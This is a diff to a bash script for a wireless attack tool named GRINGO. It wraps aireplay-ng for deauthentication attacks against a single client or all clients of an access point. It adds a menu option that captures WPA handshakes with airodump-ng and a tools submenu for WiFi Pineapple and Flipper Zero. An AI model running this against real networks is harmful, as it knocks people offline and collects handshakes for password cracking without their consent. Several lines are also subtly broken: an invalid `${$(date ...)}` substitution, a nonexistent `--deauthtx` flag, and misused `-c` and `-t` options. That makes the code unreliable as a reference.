@@ -23,11 +23,22 @@ set_color() {
     esac
 }
 
+set_bold() {
+    echo -ne "\033[1m"
+}
+
+reset_bold() {
+    echo -ne "\033[0m"
+}
+
 # =============================================================================
 # GRINGO ASCII BANNER
 # =============================================================================
 
 show_banner() {
+    set_color CYAN
+    set_bold
+    
     echo ""
     echo "                                                                                   "
     echo "                                                                                   "
@@ -44,6 +55,9 @@ show_banner() {
     echo "                    Version 2.0 - Professional Red-Team Edition                  "
     echo "                                                                                   "
     echo "                                                                                   "
+    
+    set_color RESET
+    reset_bold
 }
 
 # =============================================================================
@@ -52,6 +66,7 @@ show_banner() {
 
 print_header() {
     set_color BLUE
+    set_bold
     echo ""
     echo "================================================"
     echo "$1"
@@ -62,18 +77,21 @@ print_header() {
 
 print_success() {
     set_color GREEN
+    set_bold
     echo "$1"
     set_color RESET
 }
 
 print_warning() {
     set_color YELLOW
+    set_bold
     echo "$1"
     set_color RESET
 }
 
 print_error() {
     set_color RED
+    set_bold
     echo "$1"
     set_color RESET
 }
@@ -365,8 +383,8 @@ run_deauth_attack() {
         return 1
     fi
     
-    # Build command arguments
-    local args=("-a" "$target_bssid" "-c" "$count")
+    # Build command arguments for aireplay-ng -0
+    local args=("-0" "-a" "$target_bssid" "-c" "$count")
     
     if [[ -n "$target_mac" ]]; then
         args+=("--macdst" "$target_mac")
@@ -378,9 +396,9 @@ run_deauth_attack() {
     echo "Deauth packets: $count"
     echo ""
     
-    print_success "Executing: aireplay-ng ${args[*]}"
+    print_success "Executing: aireplay-ng -0 ${args[*]}"
     
-    # Run deauth attack
+    # Run deauth attack with -0 flag for deauthentication packets
     aireplay-ng "${args[@]}" &
     local attack_pid=$!
     
@@ -407,7 +425,7 @@ run_deauth_attack_all_clients() {
     echo "Press Ctrl+C to stop attack..."
     echo ""
     
-    # Run deauth attack targeting all clients
+    # Run deauth attack targeting all clients with -0 flag
     aireplay-ng --deauthtx -a "$BSSID" &
     local attack_pid=$!
     
@@ -418,6 +436,53 @@ run_deauth_attack_all_clients() {
     wait $attack_pid || true
     
     print_success "Deauthentication attack completed (all clients)"
+}
+
+# =============================================================================
+# HANDSHAKE CAPTURE MANAGEMENT
+# =============================================================================
+
+capture_handshake() {
+    local iface=$1
+    local bssid=$2
+    local channel=$3
+    local duration=${4:-$DURATION}
+    
+    print_header "Starting Handshake Capture"
+    
+    if [[ -z "$INTERFACE" ]]; then
+        print_error "No interface in monitor mode. Please enable monitor mode first."
+        return 1
+    fi
+    
+    # Build command arguments for airodump-ng with capture to ./captures/ folder
+    local args=("-w" "${CAPTURES_DIR}/handshake_${CHANNEL}_${$(date +%Y%m%d_%H%M%S)}.cap" "-c" "$channel")
+    
+    if [[ -n "$bssid" ]]; then
+        args+=("--bssid" "$bssid")
+    fi
+    
+    if [[ -n "$duration" ]]; then
+        args+=("-t" "$duration")
+    fi
+    
+    # Run airodump-ng with capture to captures folder
+    print_success "Executing: airodump-ng ${args[*]}"
+    
+    echo ""
+    echo "Press Ctrl+C to stop capture..."
+    echo ""
+    
+    airodump-ng "${args[@]}" &
+    local capture_pid=$!
+    
+    while kill -0 $capture_pid 2>/dev/null; do
+        sleep 1
+    done
+    
+    wait $capture_pid || true
+    
+    print_success "Handshake capture completed. Files saved to: ${CAPTURES_DIR}/"
 }
 
 # =============================================================================
@@ -534,6 +599,8 @@ flipper_zero_sync() {
 
 show_menu() {
     set_color BLUE
+    set_bold
+    
     echo ""
     echo "================================================"
     echo "GRINGO WIRELESS RECONNAISSANCE TOOL v$GRINGO_VERSION"
@@ -548,8 +615,8 @@ show_menu() {
     echo "6. WPS Scan"
     echo "7. Deauth Attack (Single Target)"
     echo "8. Deauth Attack (All Clients)"
-    echo "9. WiFi Pineapple Integration"
-    echo "10. Flipper Zero Integration"
+    echo "9. Handshake Capture"
+    echo "10. Tools Menu"
     echo "11. Exit"
     echo ""
     
@@ -636,7 +703,11 @@ main_menu() {
                 if [[ -z "$INTERFACE" ]]; then
                     print_warning "No interface in monitor mode. Please enable monitor mode first."
                 else
-                    wifi_pineapple_scan "$INTERFACE"
+                    read -p "Enter BSSID (leave empty for all): " bssid
+                    read -p "Scan duration [default: $DURATION]: " dur
+                    dur=${dur:-$DURATION}
+                    
+                    capture_handshake "$INTERFACE" "$bssid" "$CHANNEL" "$dur"
                 fi
                 ;;
                 
@@ -644,7 +715,39 @@ main_menu() {
                 if [[ -z "$INTERFACE" ]]; then
                     print_warning "No interface in monitor mode. Please enable monitor mode first."
                 else
-                    flipper_zero_scan "$INTERFACE"
+                    echo ""
+                    set_color MAGENTA
+                    set_bold
+                    echo ""
+                    echo "================================================"
+                    echo "TOOLS MENU"
+                    echo "================================================"
+                    echo ""
+                    echo "10a. WiFi Pineapple SSH Connection"
+                    echo "10b. Flipper Zero Sync"
+                    echo "10c. Exit Tools Menu"
+                    echo ""
+                    
+                    read -p "Select tool [10a-10c]: " tool_choice
+                    
+                    case $tool_choice in
+                        10a)
+                            wifi_pineapple_ssh "$INTERFACE"
+                            ;;
+                        10b)
+                            flipper_zero_sync "$INTERFACE"
+                            ;;
+                        10c)
+                            echo ""
+                            set_color RESET
+                            break
+                            ;;
+                        *)
+                            print_error "Invalid tool selection."
+                            ;;
+                    esac
+                    
+                    echo ""
                 fi
                 ;;
                 
